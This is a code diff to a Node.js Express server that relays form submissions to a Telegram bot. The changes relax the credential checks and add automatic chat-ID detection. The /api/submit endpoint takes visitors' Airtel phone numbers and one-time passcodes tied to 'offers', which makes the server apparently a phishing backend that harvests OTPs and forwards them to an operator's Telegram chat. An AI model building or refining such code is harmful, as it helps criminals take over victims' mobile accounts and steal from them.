@@ -15,7 +15,7 @@ const envPath = path.join(__dirname, '.env');
 let telegramUpdateOffset = 0;
 const telegramEnvToggle = (process.env.TELEGRAM_ENABLED || '').trim().toLowerCase();
 const hasTelegramCredentials = Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
-const TELEGRAM_ENABLED = hasTelegramCredentials || telegramEnvToggle === 'true';
+const TELEGRAM_ENABLED = Boolean(TELEGRAM_BOT_TOKEN) || telegramEnvToggle === 'true';
 
 const isPlaceholderChatId = (chatId) => !chatId || chatId === 'YOUR_CHAT_ID_HERE';
 const normalizePhone = (phone) => (phone || '').toString().replace(/\D/g, '');
@@ -32,6 +32,9 @@ const getStageForAction = (action) => {
 const orderActions = new Map();
 
 const updateEnvVar = (key, value) => {
+  if (!fs.existsSync(envPath)) {
+    return;
+  }
   const envContent = fs.readFileSync(envPath, 'utf8');
   const regex = new RegExp(`^(${key}\\s*=\\s*).*`, 'm');
   const updatedContent = envContent.match(regex)
@@ -386,8 +389,19 @@ app.post('/api/notify', async (req, res) => {
     return res.json({ success: true, note: 'notifications-disabled' });
   }
 
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  if (!TELEGRAM_BOT_TOKEN) {
     return res.status(500).json({ message: 'Identifiants de notification non configures.' });
+  }
+
+  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
+    const detectedChatId = await detectTelegramChatId();
+    if (detectedChatId) {
+      TELEGRAM_CHAT_ID = detectedChatId;
+    }
+  }
+
+  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
+    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
   }
 
   const { offerId, offerTitle, airtelNumber } = req.body;
@@ -434,8 +448,19 @@ app.post('/api/submit', async (req, res) => {
     return res.json({ success: true, note: 'notifications-disabled' });
   }
 
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+  if (!TELEGRAM_BOT_TOKEN) {
     return res.status(500).json({ message: 'Identifiants de notification non configures.' });
+  }
+
+  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
+    const detectedChatId = await detectTelegramChatId();
+    if (detectedChatId) {
+      TELEGRAM_CHAT_ID = detectedChatId;
+    }
+  }
+
+  if (!TELEGRAM_CHAT_ID || isPlaceholderChatId(TELEGRAM_CHAT_ID)) {
+    return res.status(500).json({ message: 'CHAT_ID introuvable. Envoyez /start au bot puis reessayez.' });
   }
 
   const { offerId, offerTitle, airtelNumber, otpCode } = req.body;
